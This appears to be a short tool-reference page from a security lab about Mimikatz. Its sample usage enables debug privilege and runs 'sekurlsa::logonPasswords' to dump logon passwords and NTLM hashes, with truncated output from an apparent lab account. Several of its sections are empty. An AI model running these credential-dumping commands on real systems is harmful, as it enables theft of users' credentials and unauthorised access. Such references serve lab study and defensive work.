---
title: "Mimikatz"
date: 2020-08-13T17:21:36-07:00
draft: false
weight: 7
---

![](../../images/mimikatz.png)

## Description
Mimikatz is an open-source application that allows users to view and save authentication credentials like Kerberos tickets. 

## Purpose

## Configuration Details

## Sample Usage
Start command prompt, navigate to Mimikatz directory and start Mimikatz console:
```bash
cd c:\tools\mimikatz\x64\ && mimikatz.exe
```
Debugger mode
```bash
mimikatz # privilege::debug
Privilege "20" OK
```
Module sekurlsa - Dumping logon passwords / NTLM hash
```bash
mimikatz # sekurlsa::logonPasswords

Authentication Id : 0 ; 231234 (00000000:0003a1a7)
Session : Interactive from 1
UserName : Vagrant
....
```

## Data Location

## External Links
[Mimikatz on Github](https://github.com/gentilkiwi/mimikatz)